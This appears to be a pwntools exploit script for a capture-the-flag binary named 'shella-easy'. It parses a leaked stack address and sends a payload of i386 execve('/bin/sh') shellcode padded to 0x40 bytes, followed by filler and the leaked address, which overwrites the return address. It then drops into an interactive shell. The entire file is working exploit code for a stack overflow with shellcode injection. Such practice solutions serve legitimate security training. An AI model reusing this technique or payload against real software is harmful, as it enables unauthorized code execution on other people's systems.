'''
Author: Samrito
Date: 2021-12-21 22:33:55
LastEditors: Samrito
LastEditTime: 2021-12-21 23:13:36
'''
from pwn import *

def debug(argv=''):
    gdb.attach(io, argv)
    pause()

io = process(argv=['./shella-easy'])
context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'

io.recvuntil("Yeah I'll have a ")
addr = int(io.recv(10),16)
io.recvline()
log.info(hex(addr))

# debug('b * main')
#shellcode = asm(shellcraft.sh())
shellcode = b'\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x31\xc9\x6a\x0b\x58\xcd\x80'
payload = flat([shellcode.ljust(0x40, b'\x00'), 0xdeadbeef, b'@'*8, addr])
io.sendline(payload)

io.interactive()